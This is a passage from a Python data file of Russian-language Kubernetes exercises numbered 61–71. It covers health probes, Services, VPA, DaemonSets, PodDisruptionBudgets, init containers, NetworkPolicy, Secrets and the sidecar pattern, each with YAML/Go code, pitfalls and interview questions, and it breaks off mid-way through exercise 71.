# -*- coding: utf-8 -*-
exercises = [
  {
    "num": 61,
    "title": "Практическое развертывание Liveness и Readiness проб в производственном Deployment",
    "task": "**[Probes (Liveness, Readiness)]**: Настрой в Deployment `livenessProbe` (HTTP GET `/healthz`) и `readinessProbe` (HTTP GET `/readyz`). Сымитируй зависание приложения — K8s должен перезапустить под (Liveness). Сымитируй потерю соединения с БД — K8s должен убрать под из балансировщика (Readiness).",
    "theory": "Спецификация диагностических проб в реальных продакшн-окружениях требует точной настройки таймаутов и задержек:\n- **`livenessProbe`:** опрашивает `/healthz`. Защищает от дедлоков и зависаний горутин.\n- **`readinessProbe`:** опрашивает `/ready`. Защищает от поступления трафика на неинициализированный под или при временном отказе базы данных.\n\nВ манифесте обязательно указываются `timeoutSeconds` и `failureThreshold`, предотвращающие ложные срабатывания при кратковременных нагрузочных пиках.",
    "step_by_step": "1. Создайте в Go-сервисе раздельные обработчики для `/healthz` и `/ready`.\n2. В `deployment.yaml` настройте обе пробы с индивидуальными порогами.\n3. Разверните сервис в кластере.\n4. Проверьте прохождение проверок через `kubectl describe pod`.\n5. Протестируйте поведение при временном отключении readiness.",
    "code_blocks": [
      {
        "filename": "probes.yaml",
        "lang": "yaml",
        "code": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: web-app\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: web-app\n  template:\n    metadata:\n      labels:\n        app: web-app\n    spec:\n      containers:\n        - name: app\n          image: ghcr.io/company/web-app:v1.0.0\n          ports:\n            - containerPort: 8080\n          livenessProbe:\n            httpGet:\n              path: /healthz\n              port: 8080\n            initialDelaySeconds: 5\n            periodSeconds: 10\n            timeoutSeconds: 2\n            failureThreshold: 3\n          readinessProbe:\n            httpGet:\n              path: /ready\n              port: 8080\n            initialDelaySeconds: 2\n            periodSeconds: 5\n            timeoutSeconds: 1\n            failureThreshold: 2"
      },
      {
        "filename": "main.go",
        "lang": "go",
        "code": "package main\n\nimport (\n\t\"fmt\"\n\t\"net/http\"\n)\n\nfunc main() {\n\thttp.HandleFunc(\"/healthz\", func(w http.ResponseWriter, r *http.Request) {\n\t\tw.WriteHeader(http.StatusOK)\n\t\t_, _ = w.Write([]byte(\"HEALTHY\"))\n\t})\n\n\thttp.HandleFunc(\"/ready\", func(w http.ResponseWriter, r *http.Request) {\n\t\tw.WriteHeader(http.StatusOK)\n\t\t_, _ = w.Write([]byte(\"READY\"))\n\t})\n\n\thttp.HandleFunc(\"/\", func(w http.ResponseWriter, r *http.Request) {\n\t\t_, _ = w.Write([]byte(\"Production Ready Service\"))\n\t})\n\n\tfmt.Println(\"HTTP сервер запущен на :8080\")\n\t_ = http.ListenAndServe(\":8080\", nil)\n}"
      }
    ],
    "under_the_hood": "Kubelet выполняет опрос с помощью внутреннего HTTP-клиента на ноде. Если readinessProbe возвращает ошибку, Kubelet шлет PATCH запрос в API Server, убирая флаг `Ready` из `status.conditions`. Kube-proxy удаляет IP пода из балансировки.",
    "pitfalls": "1. Забытый `timeoutSeconds`: Kubelet может подвиснуть на ожидании ответа при блокировке сокета.\n2. Проверка внешних тяжелых ресурсов в Liveness: циклический рестарт подов.\n3. Отсутствие буферизации логов доступа проб.",
    "bigtech_interview": "**Вопрос с собеседования:** Почему тайминги `periodSeconds` у readinessProbe обычно делают в 2-3 раза чаще, чем у livenessProbe?\n**Ответ:** Readiness отвечает за **качество обслуживания пользователей (User SLA)**: если под перегрузился или начал сбоить, его нужно исключить из балансировки как можно быстрее (за 2-3 секунды), чтобы минимизировать число клиентских ошибок 500. \nLiveness отвечает за **рестарт мертвого процесса**: дедлоки происходят редко, а частый рестарт тяжелого сервиса опасен, поэтому liveness опрашивают реже (раз в 10–15 секунд)."
  },
  {
    "num": 62,
    "title": "Организация доступа внутри кластера через Service (ClusterIP) и селекторы меток",
    "task": "**Доступ внутри кластера (Service)**: Поды имеют динамические IP, к ним нельзя обращаться напрямую. Создай `service.yaml` (тип `ClusterIP`). Он создаст стабильный внутренний IP и DNS-имя, балансируя нагрузку между твоими тремя подами.",
    "theory": "Поды в Kubernetes эфемерны: они пересоздаются с новыми динамическими IP-адресами при каждом деплое или масштабировании.\n\nРесурс **`Service` типа `ClusterIP`**:\n- Присваивает стабильное внутреннее DNS-имя и постоянный виртуальный IP.\n- Селектор `selector: app: auth` непрерывно сопоставляется с метками подов.\n- Автоматически распределяет входящий трафик между живыми подами через `Endpoints`.",
    "step_by_step": "1. Создайте `deployment.yaml` с меткой `app: core-api`.\n2. Создайте `service.yaml` с типом `ClusterIP` и соответствующим селектором.\n3. Примените манифесты.\n4. Проверьте список активных адресов через `kubectl get endpoints core-api-svc`.\n5. Протестируйте доступ по внутреннему DNS-имени.",
    "code_blocks": [
      {
        "filename": "service.yaml",
        "lang": "yaml",
        "code": "apiVersion: v1\nkind: Service\nmetadata:\n  name: core-api-svc\nspec:\n  type: ClusterIP\n  selector:\n    app: core-api\n  ports:\n    - name: http\n      port: 80\n      targetPort: 8080"
      },
      {
        "filename": "deployment.yaml",
        "lang": "yaml",
        "code": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: core-api\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: core-api\n  template:\n    metadata:\n      labels:\n        app: core-api\n    spec:\n      containers:\n        - name: app\n          image: alpine:3.21\n          command: [\"sleep\", \"3600\"]\n          ports:\n            - containerPort: 8080"
      }
    ],
    "under_the_hood": "CoreDNS сопоставляет имя `core-api-svc` с виртуальным ClusterIP. Kube-proxy транслирует обращения к этому IP в цепочки iptables/IPVS на ноде, перенаправляя трафик на реальные IP подов.",
    "pitfalls": "1. Опечатка в `selector.app`: `Endpoints` будет пустым `<none>`.\n2. Попытка подключения с внешней машины напрямую к ClusterIP.\n3. Несовпадение портов `port` и `targetPort`.",
    "bigtech_interview": "**Вопрос с собеседования:** Как устроен механизм обнаружения сервисов (Service Discovery) в Kubernetes без внешнего Consul или Eureka?\n**Ответ:** K8s использует встроенный DNS-сервер (CoreDNS). При создании Service создается A-запись `<service>.<namespace>.svc.cluster.local`. В `/etc/resolv.conf` каждого пода Kubelet автоматически прописывает IP CoreDNS и поисковые суффиксы. \nЛюбой микросервис на Go может просто обращаться по HTTP к `http://core-api-svc/`, а балансировку и трансляцию адресов берет на себя уровень ядра Linux (Kube-proxy iptables/IPVS)."
  },
  {
    "num": 63,
    "title": "Автоматическая оптимизация ресурсов с Vertical Pod Autoscaler (VPA)",
    "task": "Используйте **Vertical Pod Autoscaler (VPA)** для автоматического подбора requests/limits.",
    "theory": "Разработчикам сложно вручную определить точные значения `requests` и `limits` для каждого микросервиса.\n\n**Vertical Pod Autoscaler (VPA)**:\n- Непрерывно анализирует реальное потребление CPU и памяти контейнерами через Metrics API.\n- Формирует рекомендации (`Target`, `LowerBound`, `UpperBound`).\n- В режиме `updateMode: \"Off\"` позволяет безопасно проводить аудит эффективности инфраструктуры (FinOps).\n- Предотвращает как падения по OOMKilled из-за заниженных лимитов, так и переплату за простаивающие мощности (Over-provisioning).",
    "step_by_step": "1. Создайте манифест `vpa.yaml` с `updateMode: \"Off\"`.\n2. Привяжите `targetRef` к вашему Deployment.\n3. Примените манифест: `kubectl apply -f vpa.yaml`.\n4. Нагрузите сервис запросами.\n5. Проанализируйте сформированные рекомендации VPA через `kubectl describe vpa`.",
    "code_blocks": [
      {
        "filename": "vpa.yaml",
        "lang": "yaml",
        "code": "apiVersion: autoscaling.k8s.io/v1\nkind: VerticalPodAutoscaler\nmetadata:\n  name: user-service-vpa\nspec:\n  targetRef:\n    apiVersion: apps/v1\n    kind: Deployment\n    name: user-service\n  updatePolicy:\n    updateMode: \"Off\" # Только сбор рекомендаций\n  resourcePolicy:\n    containerPolicies:\n      - containerName: '*'\n        controlledResources: [\"cpu\", \"memory\"]\n        minAllowed:\n          cpu: 50m\n          memory: 64Mi\n        maxAllowed:\n          cpu: 1000m\n          memory: 2Gi"
      },
      {
        "filename": "view-recommendations.sh",
        "lang": "bash",
        "code": "# Просмотр статуса и рассчитанных рекомендаций VPA:\nkubectl describe vpa user-service-vpa"
      }
    ],
    "under_the_hood": "VPA Recommender считывает историю потребления ресурсов за последние 8 дней. \n\nОн использует 95-й процентиль утилизации CPU и пиковые значения памяти с добавлением коэффициента безопасности (safety margin 15%), рассчитывая идеальный размер пода.",
    "pitfalls": "1. Включение `updateMode: \"Auto\"` на продакшне без PDB: поды будут принудительно перезапущены одновременно.\n2. Одновременный конфликт с HPA по CPU.\n3. Отсутствие установленного `metrics-server`.",
    "bigtech_interview": "**Вопрос с собеседования:** В каких сценариях VPA предпочтительнее HPA?\n**Ответ:** Для **Stateful или монолитных сервисов**, которые невозможно легко масштабировать горизонтально добавлением реплик (например, однонодовая база данных, фоновый воркер с партиционированием по ключу, тяжелый легаси-сервис). \nТакже VPA незаменим в качестве инструмента **FinOps-аудита** для выявления сервисов, разработчики которых запросили по 8 ГБ памяти, а реально используют 200 МБ."
  },
  {
    "num": 64,
    "title": "Управление системными агентами на каждой ноде: манифест DaemonSet",
    "task": "Настрой **DaemonSet**: `kind: DaemonSet`. Запускает по одному pod на каждом node. Используй для: log collectors (Fluent Bit), monitoring agents (node-exporter), CNI plugins. Покажи node-level services.",
    "theory": "В то время как `Deployment` масштабирует произвольное число подов в кластере, **`DaemonSet` (`apiVersion: apps/v1`)** гарантирует, что **ровно один экземпляр пода запущен на каждой рабочей ноде кластера**:\n- При добавлении новой ноды в кластер DaemonSet автоматически разворачивает на ней под.\n- При удалении ноды под уничтожается сборщиком мусора.\n\nТипичные сценарии применения DaemonSet:\n1. **Сборщики логов:** Fluentbit, Vector, Promtail (читают `/var/log/pods` с диска ноды).\n2. **Мониторинг инфраструктуры:** Prometheus Node Exporter.\n3. **Сетевые агенты CNI:** Cilium, Calico (управление BPF/iptables на ноде).\n4. **Хранилища данных:** Ceph, GlusterFS, Rook.",
    "step_by_step": "1. Создайте манифест `daemonset.yaml` с `kind: DaemonSet`.\n2. Задайте селектор `app: node-monitor`.\n3. Опишите контейнер с экспортером метрик.\n4. Примените манифест: `kubectl apply -f daemonset.yaml`.\n5. Проверьте, что количество подов в выводе `kubectl get ds` строго равно количеству нод в кластере.",
    "code_blocks": [
      {
        "filename": "daemonset.yaml",
        "lang": "yaml",
        "code": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: node-monitor\n  namespace: kube-system\n  labels:\n    app: node-monitor\nspec:\n  selector:\n    matchLabels:\n      app: node-monitor\n  template:\n    metadata:\n      labels:\n        app: node-monitor\n    spec:\n      tolerations:\n        # Разрешить запуск на Master / Control-plane нодах:\n        - key: node-role.kubernetes.io/control-plane\n          operator: Exists\n          effect: NoSchedule\n      containers:\n        - name: exporter\n          image: prom/node-exporter:v1.8.2\n          ports:\n            - containerPort: 9100\n              hostPort: 9100 # Прямой проброс на порт ноды\n          resources:\n            requests:\n              cpu: 50m\n              memory: 64Mi\n            limits:\n              cpu: 100m\n              memory: 128Mi"
      },
      {
        "filename": "verify-ds.sh",
        "lang": "bash",
        "code": "# Просмотр статуса DaemonSet\nkubectl get ds -n kube-system node-monitor\n\n# Проверка: число подов строго равно числу нод:\nkubectl get nodes\nkubectl get pods -n kube-system -l app=node-monitor -o wide"
      }
    ],
    "under_the_hood": "`DaemonSetController` слушает события `NodeAdd` и `NodeDelete`. \n\nДля каждой зарегистрированной ноды контроллер проверяет наличие пода с соответствующим `nodeName`. Если нода готова, контроллер создает под с заранее заполненным полем `spec.nodeName`, минуя стандартный цикл работы `kube-scheduler`.",
    "pitfalls": "1. Забытый toleration для Control-Plane: DaemonSet не запустится на мастер-нодах из-за дефолтных taints.\n2. Конфликт `hostPort`: два разных DaemonSet не могут занять один и тот же `hostPort` на одной ноде.\n3. Отсутствие лимитов памяти: сбойный лог-коллектор на DaemonSet может съесть всю память сервера.",
    "bigtech_interview": "**Вопрос с собеседования:** В чем разница между `hostPort` и `NodePort` в Kubernetes?\n**Ответ:** \n- **`hostPort`** привязывает порт контейнера **напрямую к сетевому интерфейсу той конкретной ноды**, где запущен данный под. Трафик не маршрутизируется через kube-proxy на другие ноды. Используется почти исключительно в DaemonSet (node-exporter).\n- **`NodePort`** открывает порт на **всех нодах кластера одновременно**, независимо от того, запущен ли под на данной конкретной ноде. Трафик с любой ноды перенаправляется через kube-proxy на любую ноду, где работает под."
  },
  {
    "num": 65,
    "title": "Гарантия доступности при обслуживании: PodDisruptionBudget с minAvailable",
    "task": "Создайте **Pod Disruption Budget (PDB)** для гарантии минимального количества доступных реплик во время maintenance.",
    "theory": "Повторение и закрепление роли **PodDisruptionBudget (PDB)**:\n- Защищает высоконагруженные сервисы от одновременного выселения при обслуживании серверов (`kubectl drain`).\n- Параметр `minAvailable: 2` требует, чтобы при любых плановых операциях в кластере гарантированно оставалось в строю не менее двух работающих реплик.\n- Администратор не сможет заэвакуировать сервер, пока K8s не поднимет замену на другой ноде.",
    "step_by_step": "1. Создайте манифест `pdb.yaml`.\n2. Укажите `minAvailable: 2`.\n3. Привяжите селектор к подам сервиса `app: checkout`.\n4. Примените манифест.\n5. Проверьте допустимое количество выселений (`ALLOWED DISRUPTIONS`) через `kubectl get pdb`.",
    "code_blocks": [
      {
        "filename": "checkout-pdb.yaml",
        "lang": "yaml",
        "code": "apiVersion: policy/v1\nkind: PodDisruptionBudget\nmetadata:\n  name: checkout-pdb\nspec:\n  minAvailable: 2\n  selector:\n    matchLabels:\n      app: checkout"
      },
      {
        "filename": "check.sh",
        "lang": "bash",
        "code": "# Инспекция бюджета доступности\nkubectl get pdb checkout-pdb"
      }
    ],
    "under_the_hood": "API Server сверяет поле `status.currentHealthy` с `spec.minAvailable`. Выселение отклоняется со статусом 429, если `currentHealthy - 1 < minAvailable`.",
    "pitfalls": "1. Задание `minAvailable: 3` при реальных `replicas: 2`: запрет любого выселения, невозможность обновить ноду.\n2. Неверный селектор меток в PDB.\n3. Ожидание защиты от внезапного падения физического сервера (PDB работает только с плановыми операциями).",
    "bigtech_interview": "**Вопрос с собеседования:** Что произойдет, если запустить `kubectl drain` ноды с подами, защищенными PDB, но в кластере нет свободных ресурсов для поднятия новых реплик на других нодах?\n**Ответ:** Команда `kubectl drain` зависнет в бесконечном ожидании (или завершится по таймауту). \nK8s выселит первый допустимый под, но он зависнет в статусе `Pending` из-за нехватки ресурсов на оставшихся нодах. Поскольку `minAvailable` не будет удовлетворен, Eviction API продолжит отказывать в удалении остальных подов, защищая продакшн от падения ценой остановки планового обновления ноды."
  },
  {
    "num": 66,
    "title": "Локальное тестирование и отладка сервисов через kubectl port-forward",
    "task": "**Тест Service (Port-Forward)**: Используй команду `kubectl port-forward svc/my-service 8080:80`. Открой в браузере `localhost:8080`. Запросы пойдут с ноутбука в кластер K8s прямо на твой сервис, а оттуда на один из подов с Go-приложением.",
    "theory": "Отладка внутренних микросервисов в Kubernetes без публичного Ingress:\n- Команда `kubectl port-forward svc/<name> <local_port>:<svc_port>` создает временный SPDY-туннель.\n- Разработчик обращается к `http://localhost:8080`, а трафик прозрачно транслируется на один из подов сервиса внутри защищенного контура кластера.",
    "step_by_step": "1. Запустите сервис `my-service` в кластере.\n2. Выполните команду `kubectl port-forward svc/my-service 8080:80`.\n3. Откройте в браузере или curl адрес `http://localhost:8080`.\n4. Убедитесь в получении ответа от пода.\n5. Завершите туннель сочетанием Ctrl+C.",
    "code_blocks": [
      {
        "filename": "run-tunnel.sh",
        "lang": "bash",
        "code": "# Проброс локального порта 8080 на порт 80 сервиса\nkubectl port-forward svc/my-service 8080:80\n\n# Тест вызова:\ncurl http://localhost:8080/"
      },
      {
        "filename": "main.go",
        "lang": "go",
        "code": "package main\n\nimport (\n\t\"fmt\"\n\t\"net/http\"\n\t\"os\"\n)\n\nfunc main() {\n\tpod, _ := os.Hostname()\n\thttp.HandleFunc(\"/\", func(w http.ResponseWriter, r *http.Request) {\n\t\tfmt.Fprintf(w, \"Ответ через port-forward от пода: %s\\n\", pod)\n\t})\n\t_ = http.ListenAndServe(\":8080\", nil)\n}"
      }
    ],
    "under_the_hood": "Трафик инкапсулируется в WebSocket/SPDY поток через порт 6443 API Server, передается агенту Kubelet ноды и перенаправляется в сокет контейнера.",
    "pitfalls": "1. Использование для автоматизированных продакшн-задач.\n2. Обрыв сессии при нестабильном интернет-соединении разработчика.\n3. Попытка слушать привилегированный порт (<1024) без прав суперпользователя на ноутбуке.",
    "bigtech_interview": "**Вопрос с собеседования:** Почему для локальной разработки в BigTech часто используют инструменты вроде Telepresence вместо `kubectl port-forward`?\n**Ответ:** `port-forward` работает только в одну сторону: от разработчика в кластер. \n**Telepresence** подменяет под в кластере двунаправленным двусторонним прокси: сервис, запущенный локально в IDE на ноутбуке разработчика, может сам обращаться ко всем остальным сервисам и базам данных кластера по их внутренним именам K8s, а кластер направляет реальный трафик на ноутбук инженера, обеспечивая мгновенную отладку без пересборки образов."
  },
  {
    "num": 67,
    "title": "Startup Probe: изоляция 30-секундной миграции БД от проверок Liveness",
    "task": "**[Startup Probe]**: Если твое приложение долго стартует (например, мигрирует БД 30 секунд), Liveness-проба может убить его до старта. Добавь `startupProbe` с `failureThreshold: 30`.",
    "theory": "Если приложение при запуске выполняет внутреннюю миграцию базы данных или прогрев кэша в течение 30 секунд:\n- Обычная `livenessProbe` с периодом 5 секунд убьет под на 15-й секунде по `failureThreshold: 3`.\n- Использование `startupProbe` с параметрами `failureThreshold: 10, periodSeconds: 5` выделяет до 50 секунд на старт.\n- Проверки liveness и readiness остаются заблокированными до полного завершения миграции.",
    "step_by_step": "1. Настройте `startupProbe` в `deployment.yaml`.\n2. Задайте `failureThreshold: 10` и `periodSeconds: 5`.\n3. В коде Go добавьте симуляцию 30-секундной миграции БД перед переводом флага готовности в true.\n4. Разверните сервис.\n5. Убедитесь, что Kubelet ожидает завершения старта без рестартов.",
    "code_blocks": [
      {
        "filename": "startup-deployment.yaml",
        "lang": "yaml",
        "code": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: migration-aware-app\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: mig-app\n  template:\n    metadata:\n      labels:\n        app: mig-app\n    spec:\n      containers:\n        - name: app\n          image: ghcr.io/company/mig-app:v1.0.0\n          ports:\n            - containerPort: 8080\n          startupProbe:\n            httpGet:\n              path: /healthz\n              port: 8080\n            failureThreshold: 10 # 10 * 5с = 50 секунд на старт\n            periodSeconds: 5\n          livenessProbe:\n            httpGet:\n              path: /healthz\n              port: 8080\n            periodSeconds: 5\n            failureThreshold: 2"
      },
      {
        "filename": "main.go",
        "lang": "go",
        "code": "package main\n\nimport (\n\t\"fmt\"\n\t\"net/http\"\n\t\"sync/atomic\"\n\t\"time\"\n)\n\nvar isInitialized atomic.Bool\n\nfunc main() {\n\tgo func() {\n\t\tfmt.Println(\"Запуск 30-секундной миграции базы данных...\")\n\t\ttime.Sleep(30 * time.Second)\n\t\tisInitialized.Store(true)\n\t\tfmt.Println(\"Миграция завершена. Сервис готов!\")\n\t}()\n\n\thttp.HandleFunc(\"/healthz\", func(w http.ResponseWriter, r *http.Request) {\n\t\tif !isInitialized.Load() {\n\t\t\tw.WriteHeader(http.StatusServiceUnavailable)\n\t\t\t_, _ = w.Write([]byte(\"MIGRATING\"))\n\t\t\treturn\n\t\t}\n\t\tw.WriteHeader(http.StatusOK)\n\t\t_, _ = w.Write([]byte(\"READY\"))\n\t})\n\n\t_ = http.ListenAndServe(\":8080\", nil)\n}"
      }
    ],
    "under_the_hood": "Kubelet удерживает статус `Started: False` в `status.containerStatuses`. Пока этот флаг ложен, вызовы livenessProbe подавляются.",
    "pitfalls": "1. Заниженный `failureThreshold`: рестарт пода прямо посреди миграции БД.\n2. Неперехваченные паники во время старта.\n3. Отсутствие таймаутов на сетевых вызовах к СУБД.",
    "bigtech_interview": "**Вопрос с собеседования:** Почему запуск тяжелых миграций БД внутри `main()` самого веб-сервиса считается плохой практикой по сравнению с K8s Job?\n**Ответ:** Если развернуть Deployment из 10 реплик, все 10 подов одновременно стартуют и попытаются параллельно накатить одни и те же DDL-миграции схемы на базу данных. Это вызывает взаимные блокировки таблиц (Exclusive Table Locks) и падение транзакций. \nПравильный подход — выносить миграции схемы в отдельный **K8s Job** (или Helm pre-upgrade hook), который запускается ровно в **одном экземпляре** до старта веб-серверов."
  },
  {
    "num": 68,
    "title": "Init Containers: блокировка старта пода утилитой nc до доступности базы данных",
    "task": "Настрой **Init Containers**: `initContainers: - name: wait-for-db, image: busybox, command: ['sh', '-c', 'until nc -z postgres 5432; do sleep 2; done']`. Запускается перед основным контейнером, должен завершиться успешно. Покажи dependency management.",
    "theory": "Проверка доступности сетевого сокета зависимостей через **`Init Containers`**:\n- Легковесный контейнер `busybox` выполняет команду `nc -z db-host 5432` в цикле.\n- Основной сервис на Go не начнет компилироваться или стартовать, пока сокет базы данных не откроется.\n- Разделение ответственности: код приложения освобождается от бесконечных retry-циклов ожидания сети.",
    "step_by_step": "1. Добавьте в `deployment.yaml` секцию `initContainers`.\n2. Используйте образ `busybox:1.37`.\n3. Добавьте команду: `until nc -z -v -w3 db-service 5432; do sleep 2; done`.\n4. Разверните манифест.\n5. Проследите за переходом статуса пода из `Init:0/1` в `PodInitializing` и затем в `Running`.",
    "code_blocks": [
      {
        "filename": "init-nc.yaml",
        "lang": "yaml",
        "code": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: order-service\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: order-service\n  template:\n    metadata:\n      labels:\n        app: order-service\n    spec:\n      initContainers:\n        - name: wait-for-db\n          image: busybox:1.37\n          command:\n            - /bin/sh\n            - -c\n            - |\n              echo \"Проверка доступности порта БД...\"\n              until nc -z -w 2 postgres-service 5432; do\n                echo \"Порт 5432 закрыт, повтор через 2с...\"\n                sleep 2\n              done\n              echo \"База данных доступна по сети!\"\n      containers:\n        - name: app\n          image: ghcr.io/company/order-service:v1.0.0\n          ports:\n            - containerPort: 8080"
      }
    ],
    "under_the_hood": "`kubelet` запускает контейнер `wait-for-db`. Утилита `nc` (netcat) шлет SYN-пакет на порт 5432. \n\nПри получении SYN-ACK соединение закрывается, цикл завершается с кодом 0, контейнер переходит в статус `Completed`, и Kubelet начинает развертывание основного контейнера `app`.",
    "pitfalls": "1. Доступность порта не означает готовность СУБД: сокет может быть открыт, но база данных может находиться в режиме Recovery и не принимать SQL-запросы.\n2. Бесконечный цикл без таймаута при опечатке в адресе хоста.\n3. Отсутствие DNS-записи сервиса.",
    "bigtech_interview": "**Вопрос с собеседования:** Почему `nc -z` (проверка TCP-сокета) не всегда достаточна для проверки готовности PostgreSQL, и чем ее заменяют?\n**Ответ:** При старте PostgreSQL открывает слушающий TCP-сокет на раннем этапе, когда процесс еще выполняет рекавери WAL-логов и запрещает клиентские подключения (`the database system is starting up`). Проверка `nc -z` завершится успехом, но приложение упадет при первой SQL-транзакции. \nВместо чистого TCP-netcat используют утилиту **`pg_isready`**, которая отправляет протокольный пакет и проверяет, что сервер перешел в статус `ready to accept connections`."
  },
  {
    "num": 69,
    "title": "Изоляция микросервиса с помощью NetworkPolicy: ограничение входящего и исходящего трафика",
    "task": "Настройте **Network Policies** для изоляции: поды вашего сервиса могут общаться только с БД и другими разрешёнными сервисами.",
    "theory": "Практика построения безопасного сетевого периметра:\n- `policyTypes: [Ingress, Egress]`\n- Разрешить **Ingress** только от проверенного API Gateway.\n- Разрешить **Egress** только к локальному DNS (порт 53) и к базе данных PostgreSQL (порт 5432).\n- Любые несанкционированные попытки подключения во внешний интернет или к соседним микросервисам блокируются.",
    "step_by_step": "1. Создайте `strict-network-policy.yaml`.\n2. Опишите правила Ingress и Egress.\n3. Добавьте обязательное разрешение исходящего UDP/TCP 53 трафика для CoreDNS.\n4. Примените манифест.\n5. Протестируйте сетевую изоляцию.",
    "code_blocks": [
      {
        "filename": "strict-network-policy.yaml",
        "lang": "yaml",
        "code": "apiVersion: networking.k8s.io/v1\nkind: NetworkPolicy\nmetadata:\n  name: strict-order-policy\n  namespace: production\nspec:\n  podSelector:\n    matchLabels:\n      app: order-service\n  policyTypes:\n    - Ingress\n    - Egress\n  ingress:\n    # Разрешить входящие запросы только от API Gateway\n    - from:\n        - podSelector:\n            matchLabels:\n              app: api-gateway\n      ports:\n        - protocol: TCP\n          port: 8080\n  egress:\n    # 1. Обязательный доступ к CoreDNS\n    - to:\n        - namespaceSelector: {}\n          podSelector:\n            matchLabels:\n              k8s-app: kube-dns\n      ports:\n        - protocol: UDP\n          port: 53\n        - protocol: TCP\n          port: 53\n    # 2. Доступ к базе данных PostgreSQL\n    - to:\n        - podSelector:\n            matchLabels:\n              app: postgres-db\n      ports:\n        - protocol: TCP\n          port: 5432"
      }
    ],
    "under_the_hood": "CNI-плагин применяет eBPF-карты маршрутизации на сокетах пода. Пакеты, не соответствующие правилам Egress, сбрасываются ядром (drop), вызывая таймаут соединения на клиенте.",
    "pitfalls": "1. Забытое разрешение DNS (порт 53) в Egress: приложение перестанет резолвить любые доменные имена сервисов и упадет.\n2. Неподдерживаемый CNI (например, дефолтный Flannel).\n3. Опечатки в метках селекторов.",
    "bigtech_interview": "**Вопрос с собеседования:** Что произойдет с подом, если применить `NetworkPolicy` с пустым блоком `ingress: []` и `policyTypes: [Ingress]`?\n**Ответ:** Это стандартный паттерн **«Default Deny Ingress»**. \nПод будет полностью изолирован от любого входящего трафика: ни один другой под в кластере (включая Ingress-контроллер и сервисы) не сможет открыть TCP-соединение к этому поду. Это используется в качестве базовой линии безопасности перед добавлением явных разрешающих правил."
  },
  {
    "num": 70,
    "title": "Управление паролями БД через Kubernetes Secret и переменные окружения",
    "task": "Управляйте секретами: создайте Kubernetes Secret для пароля БД и монтируйте его как переменную окружения в поде.",
    "theory": "Закрепление безопасной передачи пароля СУБД:\n- Создание `Secret` типа `Opaque` со `stringData`.\n- Проброс секрета через `valueFrom.secretKeyRef` в переменную окружения `DB_PASSWORD`.\n- Чтение переменной в коде Go и формирование строки подключения к СУБД.",
    "step_by_step": "1. Создайте манифест `secret.yaml`.\n2. В манифесте `deployment.yaml` свяжите секрет с переменной окружения.\n3. В коде Go инициализируйте соединение с СУБД.\n4. Примените манифесты.\n5. Проверьте логи успешного подключения пода.",
    "code_blocks": [
      {
        "filename": "secret.yaml",
        "lang": "yaml",
        "code": "apiVersion: v1\nkind: Secret\nmetadata:\n  name: database-credentials\ntype: Opaque\nstringData:\n  PASSWORD: \"SuperSecureProductionPassword2026\" "
      },
      {
        "filename": "deployment.yaml",
        "lang": "yaml",
        "code": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: account-service\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: account-service\n  template:\n    metadata:\n      labels:\n        app: account-service\n    spec:\n      containers:\n        - name: app\n          image: ghcr.io/company/account:v1.0.0\n          env:\n            - name: DB_PASSWORD\n              valueFrom:\n                secretKeyRef:\n                  name: database-credentials\n                  key: PASSWORD"
      },
      {
        "filename": "main.go",
        "lang": "go",
        "code": "package main\n\nimport (\n\t\"fmt\"\n\t\"os\"\n)\n\nfunc main() {\n\tpass := os.Getenv(\"DB_PASSWORD\")\n\tif pass == \"\" {\n\t\tpanic(\"DB_PASSWORD не задан!\")\n\t}\n\tfmt.Printf(\"Сервис аккаунтов: пароль получен (длина: %d симв.)\\n\", len(pass))\n}"
      }
    ],
    "under_the_hood": "Секрет считывается Kubelet из API-сервера и инжектируется в окружение контейнера в момент вызова runtime API `CreateContainer`.",
    "pitfalls": "1. Логирование пароля в stdout.\n2. Хранение незашифрованного манифеста секрета в публичном Git.\n3. Опечатка в имени ключа `key`.",
    "bigtech_interview": "**Вопрос с собеседования:** Почему передача паролей через файлы в `tmpfs` томе считается более защищенной, чем через переменные окружения?\n**Ответ:** Переменные окружения процесса видны в системных файлах `/proc/$PID/environ` и часто автоматически прикрепляются библиотеками трейсинга ошибок (Sentry) при сбоях. Файлы в памяти `tmpfs` изолированы правами доступа Linux (0400), не попадают в дампы окружения и поддерживают автоматическую ротацию без перезапуска контейнера."
  },
  {
    "num": 71,
    "title": "Паттерн проектирования Sidecar: основной сервис и вспомогательный реверс-прокси Envoy",
    "task": "Настрой **Sidecar Pattern**: основной контейнер `app` + sidecar `nginx` (reverse proxy) или `envoy` (service mesh). Shared `emptyDir` volume для Unix socket communication. Покажи separation of concerns.",
    "theory": "Паттерн **`Sidecar` (Коляска мотоцикла)** — архитектурный паттерн контейнеризации:\n- Внутри одного `Pod` запускаются два контейнера:\n  1. **Основной контейнер приложения (Go):** содержит только бизнес-логику.\n  2. **Вспомогательный контейнер (Sidecar — Envoy/Nginx):** берет на себя сквозную функциональность (терминация mTLS, rate limiting, сбор метрик Prometheus, сжатие gzip).\n- Контейнеры делят общий сетевой стек (**Shared Network Namespace**) и общаются между собой на максимальной скорости через **`localhost`** без сетевых накладных расходов.",
    "step_by_step": "1. Создайте манифест `pod-sidecar.yaml` с двумя контейнерами в `spec.containers`.\n2. Контейнер 1: Go-приложение, слушающее порт 8080.\n3. Контейнер 2: Nginx/Envoy прокси, слушающий внешний порт 80 и перенаправляющий на `127.0.0.1:8080`.\n4. Примените манифест.\n5. Протестируйте вызов внешнего порта 80.",
    "code_blocks": [
      {
        "filename": "sidecar-deployment.yaml",
        "lang": "yaml",
